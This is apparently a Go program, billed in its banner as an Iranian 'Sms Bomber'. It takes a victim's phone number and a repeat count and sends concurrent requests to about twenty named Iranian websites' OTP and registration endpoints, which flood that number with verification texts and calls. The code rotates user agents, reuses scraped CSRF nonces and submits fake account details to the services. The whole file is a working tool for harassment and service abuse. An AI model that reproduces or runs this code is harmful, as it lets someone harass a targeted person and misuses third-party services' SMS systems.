/* coded by @monsmain
⚠️NOTE en:
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
*/
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"net/http/cookiejar"
	"math/rand" 
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
}
//Code by @monsmain
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(client *http.Client, ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	randomIndex := rand.Intn(len(userAgents))
	selectedUserAgent := userAgents[randomIndex]

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/json")
        req.Header.Set("User-Agent", selectedUserAgent) 


		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
//Code by @monsmain
func sendFormRequest(client *http.Client, ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	randomIndex := rand.Intn(len(userAgents))
	selectedUserAgent := userAgents[randomIndex]

	const maxRetries = 3
	const retryDelay = 3 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
        req.Header.Set("User-Agent", selectedUserAgent) 


		resp, err := client.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	randomIndex := rand.Intn(len(userAgents))
	selectedUserAgent := userAgents[randomIndex]


	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
        req.Header.Set("User-Agent", selectedUserAgent)


		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
//Code by @monsmain
func formatPhoneWithSpaces(p string) string {
	p = getPhoneNumberNoZero(p)
	if len(p) >= 10 {
		if len(p) >= 10 {
			return p[0:3] + " " + p[3:6] + " " + p[6:10]
		}
		return p
	}
	return p
}
func getPhoneNumberNoZero(phone string) string {
	if strings.HasPrefix(phone, "0") {
		return phone[1:]
	}
	return phone
}

func getPhoneNumber98NoZero(phone string) string {
	return "98" + getPhoneNumberNoZero(phone)
}

func getPhoneNumberPlus98NoZero(phone string) string {
	return "+98" + getPhoneNumberNoZero(phone)
}

func main() {

	rand.Seed(time.Now().UnixNano())

	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
            *@@%#             -@@@@@@.            #@@@+             
            .%@@#  @monsmain  +@@@@@@=  Sms Bomber #@@#              
             :@@*            =%@@@@@@%-   irani    *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+   #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m156 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms&call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int 
//Code by @monsmain
	switch strings.ToLower(speedChoice) { 
	case "fast":

		numWorkers = 90 
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":

		numWorkers = 40 
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:

		numWorkers = 40 
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}//Code by @monsmain


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

cookieJar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: cookieJar,
        Timeout: 10 * time.Second,
	}

	tasks := make(chan func(), repeatCount*50)

	var wg sync.WaitGroup

	ch := make(chan int, repeatCount*50)

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	for i := 0; i < repeatCount; i++ {

	
// --- tosinso.com ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "mobilePrefix": "98",
            "mobile": phone,
        }
        sendJSONRequest(c, ctx, "https://tosinso.com/api/account/sendverificationcode", payload, &wg, ch)
    }
}(client)

// --- raychat.io (GET) ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        rid := "68834efb22b9366bb7367b6b" // مقدار نمونه، مقدار ریلی ممکنه باید داینامیک باشه
        urlWithParams := fmt.Sprintf("https://widget-service.raychat.io/widget/8935f66a-7fb4-4967-bcfb-4a95d4aa5e02?rid=%s&href=https://tosinso.com/login", rid)
        sendGETRequest(c, ctx, urlWithParams, &wg, ch)
    }
}(client)

// --- yektanet.com (GET) ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        appID := "W1gWdCsq"
        urlWithParams := fmt.Sprintf("https://audience.yektanet.com/api/v1/scripts/preview/validate/?app_id=%s", appID)
        sendGETRequest(c, ctx, urlWithParams, &wg, ch)
    }
}(client)

// --- khonyagar.com (مرحله اول) ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "cellphone": getPhoneNumberPlus98NoZero(phone),
        }
        sendJSONRequest(c, ctx, "https://accounts.khonyagar.com/api/v1/auth/request/", payload, &wg, ch)
    }
}(client)

// --- quera.org ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "phone_number": phone,
            "country_code": "+98",
            "captcha_token": "",
        }
        sendJSONRequest(c, ctx, "https://quera.org/accounts/api/register/phone/otp", payload, &wg, ch)
    }
}(client)

// --- bonyani.ir ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "emailOrPhoneNo": getPhoneNumberPlus98NoZero(phone),
            "terminal":       101,
            "terminalVersion": 50502,
            "sendOtp":        false,
        }
        sendJSONRequest(c, ctx, "https://api.bonyani.ir/Auth/VerificationCode/GetForLogin", payload, &wg, ch)
    }
}(client)

// --- armanienglish.com ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("email", "codedbymonsmain@gmail.com")
        formData.Set("mobile", "98"+getPhoneNumberNoZero(phone))
        formData.Set("password", "monsmain@")
        sendFormRequest(c, ctx, "https://sso.armanienglish.com/api/register", formData, &wg, ch)
    }
}(client)

// --- tikkaa.ir ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "mobile": phone,
        }
        sendJSONRequest(c, ctx, "https://api.tikkaa.ir/api/user/register/first", payload, &wg, ch)
    }
}(client)

// --- englishturbo.com ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("first_name", "مانس")
        formData.Set("last_name", "مین")
        formData.Set("phone_mobile", phone)
        formData.Set("password", "monsmain@")
        sendFormRequest(c, ctx, "https://backwapp.englishturbo.com/api/v1/reg-user/", formData, &wg, ch)
    }
}(client)

// --- fenefx.net ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "username": phone,
            "password": "monsmain@",
            "level":    "user",
        }
        sendJSONRequest(c, ctx, "https://crm.fenefx.net/api/v1/auth/register", payload, &wg, ch)
    }
}(client)

// --- taraz.org ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "phone_number": phone,
        }
        sendJSONRequest(c, ctx, "https://app.taraz.org/api/core/v2/user/request_web_otp_sms/", payload, &wg, ch)
    }
}(client)

// --- amoozaa.ir ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("username", phone)
        sendFormRequest(c, ctx, "https://www.amoozaa.ir/send-register-code", formData, &wg, ch)
    }
}(client)

// --- paresh.ir ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "phone_number": phone,
            "return_to":    "/",
        }
        sendJSONRequest(c, ctx, "https://api.paresh.ir/api/user/otp/code/", payload, &wg, ch)
    }
}(client)

// --- mozafarinia.com (Form) ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("action", "digits_check_mob")
        formData.Set("countrycode", "+98")
        formData.Set("mobileNo", formatPhoneWithSpaces(phone))
        formData.Set("csrf", "6c597fec7e")
        formData.Set("login", "2")
        formData.Set("username", "")
        formData.Set("email", "")
        formData.Set("captcha", "")
        formData.Set("captcha_ses", "")
        formData.Set("digits", "1")
        formData.Set("json", "1")
        formData.Set("whatsapp", "0")
        formData.Set("digits_reg_name", "مانس")
        formData.Set("digits_reg_text1610", "مین")
        formData.Set("digits_reg_mail", formatPhoneWithSpaces(phone))
        formData.Set("digregcode", "+98")
        formData.Set("digits_reg_password", "monsmain@")
        formData.Set("dig_otp", "")
        formData.Set("code", "")
        formData.Set("dig_reg_mail", "")
        formData.Set("dig_nounce", "6c597fec7e")
        sendFormRequest(c, ctx, "https://mozafarinia.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }
}(client)

// --- agahclinic.com (Form) ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("action", "voorodak__submit-username")
        formData.Set("username", phone)
        formData.Set("security", "72e3da03cd")
        sendFormRequest(c, ctx, "https://agahclinic.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }
}(client)

// --- alimirsadeghi.com (Form) ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("action", "send_login_otp")
        formData.Set("phone", phone)
        sendFormRequest(c, ctx, "https://alimirsadeghi.com/n-ajax", formData, &wg, ch)
    }
}(client)

// --- gw.darmankade.com (JSON) ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "UserName": phone,
            "invitationCode": "",
            "CaptchaToken": "",
            "RouterPath": "",
            "UserAgent": "",
        }
        sendJSONRequest(c, ctx, "https://gw.darmankade.com/Account/SendCode", payload, &wg, ch)
    }
}(client)

// --- doctoreto.com (JSON) ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "mobile":     getPhoneNumberNoZero(phone),
            "country_id": 205,
            "captcha":    "",
        }
        sendJSONRequest(c, ctx, "https://api.doctoreto.com/api/web/patient/v1/accounts/register", payload, &wg, ch)
    }
}(client)

// --- hamkadeh.com (JSON) ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "mobile": phone,
            "type": "sms",
            "captcha": "",
        }
        sendJSONRequest(c, ctx, "https://api.hamkadeh.com/api/site/auth/login/send-code", payload, &wg, ch)
    }
}(client)

// --- haal.ir (JSON) ✅
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "DeviceId": "undefined",
            "Email": "",
            "Password": "",
            "PlatformName": "WebApplication",
            "IsEnergyDana": false,
            "UserName": phone,
        }
        sendJSONRequest(c, ctx, "https://haal.ir/api/v2/User/UserRegisterVerifyWeb", payload, &wg, ch)
    }
}(client)




		
	}

	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
